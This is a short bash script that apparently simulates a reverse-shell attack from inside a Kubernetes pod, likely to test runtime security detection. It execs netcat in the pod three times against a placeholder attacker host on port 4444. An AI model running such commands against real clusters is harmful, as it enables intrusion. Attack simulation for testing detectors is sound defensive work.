#!/usr/bin/env bash
ATTACK=reverse_shell_nosh; . "$(dirname "$0")/_lib.sh"
echo "[attack:$ATTACK] pod=$POD t=$(date +%s)"   # no `sh` inside the pod: the exec is nc itself
for i in 1 2 3; do kubectl -n "$NS" exec "$POD" -- nc -z -w1 "$ATTACKER" 4444 || true; done
